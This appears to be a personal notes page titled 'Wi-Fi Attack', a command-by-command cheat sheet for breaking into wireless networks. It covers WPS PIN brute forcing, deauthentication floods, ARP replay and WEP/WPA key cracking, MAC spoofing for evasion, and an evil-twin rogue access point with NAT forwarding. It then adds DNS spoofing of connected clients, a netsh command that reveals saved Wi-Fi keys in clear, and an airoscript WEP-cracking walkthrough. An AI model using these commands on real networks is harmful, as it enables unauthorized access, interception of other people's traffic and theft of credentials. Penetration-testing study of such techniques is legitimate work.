---
title: Wi-Fi Attack
draft:
tags:
  - T1669
---

![[Pasted image 20260308174341.png]]

> [!danger]+ WPA/WPA2 Association & 4‑Way Handshake
>
>
>```mermaid
>graph LR
>
>subgraph CLIENT
>C1[Client Scanning]
>C2[Probe Request]
>C3[Authentication Request]
>C4[Association Request]
>C5[EAPOL Msg2<br/>SNonce + MIC]
>C6[EAPOL Msg4<br/>ACK]
>C7[Encrypted Traffic]
>end
>
>subgraph ACCESS_POINT
>A1[Beacon Broadcast]
>A2[Probe Response]
>A3[Authentication Response]
>A4[Association Response]
>A5[EAPOL Msg1<br/>ANonce]
>A6[EAPOL Msg3<br/>GTK + Install PTK]
>A7[Encrypted Traffic]
>end
>
>A1 --> C1
>C2 --> A2
>C3 --> A3
>C4 --> A4
>A5 --> C5
>C5 --> A6
>A6 --> C6
>C7 --> A7
>```

 > [!info]+ monitor Mode
 > 
> ```
>airmon-ng check kill
> airmon-ng start wlan0 
> ```
> ```
> airmong-ng stop wlan0mon
> systemctl restart NetworkManager
> systemctl restart iwd
> ```
> ```
> airmon-ng check kill 
> ```
> ```
> iwconfig;ifconfig // for check
> ```
>
>![[Pasted image 20260306201728.png]]
> ### Optional
> - change channel
> ```
> iwconfig wlan0 channel 6
> ```
> ### Wireshark
> ```
> > wireshark &
> ```
> ![[Pasted image 20260306203104.png]]
> ### Airodump
> ```
> airodump-ng -b bg wlan0mon
> ```
> ![[Pasted image 20260306205627.png]]
> - Select target For Monitoring
> ```
> airodump-ng wlan0mon -b bg -c 6 --bssid <bssid> -w /home/user/filename
> ```

> [!success]- Option WPS 
> ```
> airmon-ng check kill
> airmon-ng start wlan0 
> ```
> ```
> sudo wash -i wlan0 -s
> ```
> ```
> reaver -i wlan0mon -c <channel> -b <bssid> -f -vv --fail-wait=360 -d=61
>```
>> [!warning] Note
>> if Wi-fi channel Set auto don't use -f option 

> [!danger]- Aireplay
> - DeAuth Request
> A **Deauthentication attack** forces connected clients to disconnect from a wireless access point by sending forged deauthentication frames.
These frames impersonate the legitimate AP and instruct clients that their session is no longer valid
> ```
> aireplay-ng wlan0mon --deauth 0 -a <bssid>
> ```
> - ARP Request
> ```
> aireplay-ng wlan0mon --arpreplay -e <ESSID>
> ```
>> [!tip] Note
>> Wait until the captured traffic reaches at least 3000 packets.
A larger number of packets increases the effectiveness of the ARP replay attack,
which helps generate sufficient IVs required for WEP key cracking.

>[!info]- Crack
> - WEP (RC4) 
> ```
> aircrack-ng filename.cap
> ```
> - WPA (AES) 
> ```
> aircrack-ng filename.cap -w /usr/../rockyou
> ```
> - Create Word List
> ```
> crunch 4 6 sbcdfsg1234 # create random pass with this charecter
> crunch 3 3 -p pitzza 123 football cat # create pass with this 3 word 
> ```

> [!hint]- Evasion
> ### Mac Changer
> ```
>airmong-ng stop wlan0mon
> ifconfig wlan0 down
> macchanger -m <fakemac> wlan0
> ifconfig wlan0 up
> ```

> [!danger]- Evil Towin
> ```
> macchanger -m AA:BB:CC:DD:EE:FF
> airmon-ng check kill
> airmon-ng wlan0 start
> airodump-ng wlan0mon 
> airodump-ng wlan0mon -c 6 --bssid <bssid> -w /home/user/filename
> ```
>
>> [!info] Create Fake AP
>> - No Password
>> ```
>>airbase-ng wlan0mon --essid "prob" -a AA:AA:AA:AA:AA:AA -c 6 -v
>> ```
>> -WEP (RC4)
>> ```
>> airbase-ng wlan0mon --essid "prob" -a AA:AA:AA:AA:AA:AA -c 6 -W 1 -v
>> ```
>> - WPA (TKIP AES)
>>```
>>airbase-ng wlan0mon --essid "prob" -a BB:BB:BB:BB:BB:BB -c 6 -W 1 -z 2 -v
>>```
>>```
>>airbase-ng wlan0mon --essid "prob" -a AA:BB:CC:32:FF:AA -c 6 -z 4 -v
>>```
>>- WPA2 (TKIP AES)
>>```
>>airbase-ng wlan0mon --essid "prob" -a AA:BB:CC:32:FF:AA -c 6 -Z 2 -v 
>>```
>>```
>>airbase-ng wlan0mon --essid "prob" -a AA:BB:CC:32:FF:AA -c 6 -W 1 -Z 4 -v
>>```
>>- Optional 
>> Create AP for all prob request
>> ```
>> airbase-ng wlan0mon -P -C 10 AA:BB:CC:DD:EE:FF -v
>> ```
>
>
>> [!hint] DeAuth Request For Disconnect Client
>> ```
>> aireplay-ng wlan0mon --deauth 0 -a <bssid>
>> ```
>
>- Check for Handshake
>```
>aircrack-ng targetfile.cap
>```
>
>> [!cite] Configure Interface & Routing
>> Bring up the virtual interface created by **airbase-ng**:
>> ```
>> ifconfig at0 up
>> ```
>> Enable NAT so clients connected to the fake AP can access the internet through the attacker machine:
>> ```
>> sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
>> sudo iptables -A FORWARD -i at0 -o wlan0 -j ACCEPT
>> sudo iptables -A FORWARD -i wlan0 -o at0 -j ACCEPT
>> ```
>> Assign IP address to the rogue AP interface:
>> ```
>> sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0
>> ```
>> Enable IP forwarding:
>> ```
>> sudo sysctl -w net.ipv4.ip_forward=1
>> ```
>
>> [!hint] Post Attack
>> - Sniff DNS query client
>> ```
>> dnsspoof -i <interface>
>> ```
>> - sniff Packet 
>> ```
>> airdecap-ng -e "Devname" -p ***** file.cap
>> ```

>[!info]- Windows
>```
> cmd > netsh wlan show networks
> cme > netsh wlan connect name="" ssid="" interface="Wi-Fi"
>cmd > netsh wlan show profiles
>cmd > netsh wlan show profile name="" key=clear
> cmd > netsh wlan show interfaces
> cmd > netsh wlan show drivers
>```

> [!abstract] WEP Cracking with Airoscript
> **Wired Equivalent Privacy (WEP)** is a highly vulnerable and obsolete Wi-Fi encryption protocol. `airoscript` is an interactive wrapper script for the Aircrack-ng suite, designed to automate the process of cracking WEP keys.

> [!warning] Context
> WEP can be cracked easily because of flaws in its IV (Initialization Vector) generation. It requires collecting a large number of packets (usually via ARP replay) to recover the key.

## Step-by-Step Workflow

> [!example]+ Interactive Airoscript Workflow
> Launch `airoscript` and follow the menu numbers to put the card into monitor mode, select a target, capture traffic, and crack the key.
> 
> ```bash
> # Start airoscript
> airoscript
> ```
> 
> **Step 1: Interface & Monitor Mode**
> ```text
> Option: 1       # Put interface into monitor mode
> Option: 4       # Select the interface
> ```
> 
> **Step 2: Scanning for Targets**
> ```text
> Input number: 1 # Scan
> Input number: 1 # No filter
> Input number: 1 # Channel hopping
> # Press Ctrl + C to stop scanning when you see the target
> ```
> 
> **Step 3: Select Target & Associated Client**
> ```text
> Input number: 2 # Select target
> Input number: * # (Select the specific target number from the list)
> Option: 1       # Client associated
> Option: 1       # Select MAC of the associated client
> ```
> 
> **Step 4: Attack (Capture & ARP Replay)**
> ```text
> Input number: 3 # Attack
> Option: 7       # ARP replay automatic (Generates IVs)
> ```
> 
> **Step 5: Deauthentication (Force Traffic)**
> ```text
> Input number: 6 # Send deauth packets
> Option: 3       # Selected client (to force reconnect and generate ARP packets)
> ```
> 
> **Step 6: Cracking the Key**
> ```text
> Input number: 4 # Crack option
> Option: 1       # Aircrack PTW (Use the PTW attack to crack the WEP key)
> ```



